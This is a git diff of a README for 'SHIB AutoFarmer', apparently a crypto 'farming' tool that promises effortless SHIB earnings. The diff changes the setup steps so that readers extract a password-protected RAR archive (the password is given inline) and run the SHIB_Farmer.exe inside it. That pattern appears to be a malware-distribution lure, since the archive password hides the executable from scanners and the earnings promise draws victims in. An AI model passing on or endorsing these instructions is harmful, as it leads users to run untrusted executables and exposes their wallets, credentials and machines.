@@ -1,6 +1,6 @@
 # 🚀 SHIB AutoFarmer | Fully Automatic Farming Tool
 
-![SHIB Logo](shib_logo.png)
+![SHIB Logo](Shib_logo.png)
 
 ### 💰 Earn SHIB effortlessly with this automated tool!
 
@@ -17,7 +17,7 @@
 
 ## 🛠 Setup Instructions:
 ### 🔹 Windows (.exe) - Recommended:
-1️⃣ Download and extract the `.zip` file.  
+1️⃣ Download and extract the `SHIB_Farmer.rar` (Pass:1234szf).  
 2️⃣ Run `SHIB_Farmer.exe`.  
 3️⃣ Enjoy automated farming! 🚀  
 
